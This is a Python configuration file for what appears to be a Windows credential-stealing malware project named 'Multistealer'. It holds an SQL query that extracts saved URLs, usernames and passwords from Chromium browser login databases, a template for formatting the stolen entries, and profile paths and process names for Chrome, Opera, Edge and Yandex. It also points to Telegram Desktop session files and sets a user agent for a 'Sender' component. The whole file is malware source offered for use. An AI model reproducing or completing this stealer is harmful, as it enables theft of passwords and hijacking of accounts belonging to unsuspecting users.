from enum import Enum
from os import environ

user_profile = environ.get("USERPROFILE")


class Browsers(Enum):
    CHROME = "Chrome"
    OPERA_GX = "Opera GX"
    OPERA_DEFAULT = "Opera Default"
    EDGE = "Microsoft Edge"
    YANDEX = "Yandex"


class ChromiumConfig:
    PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
    PasswordsData = "URL: {0}\nUsername: {1}\nPassword: {2}\n\n"


class MultistealerConfig:
    PoolSize = 5

    BrowsersData = {
        Browsers.CHROME: {
            "path": rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
            "process": "chrome.exe",
        },
        Browsers.OPERA_GX: {
            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
            "process": "opera.exe",
        },
        Browsers.OPERA_DEFAULT: {
            "path": rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
            "process": "opera.exe",
        },
        Browsers.EDGE: {
            "path": rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
            "process": "msedge.exe",
        },
        Browsers.YANDEX: {
            "path": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
            "process": "browser.exe",
        },
    }


class SenderConfig:
    UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"


class TelegramConfig:
    SessionsPath = rf"{user_profile}\AppData\Roaming\Telegram Desktop"
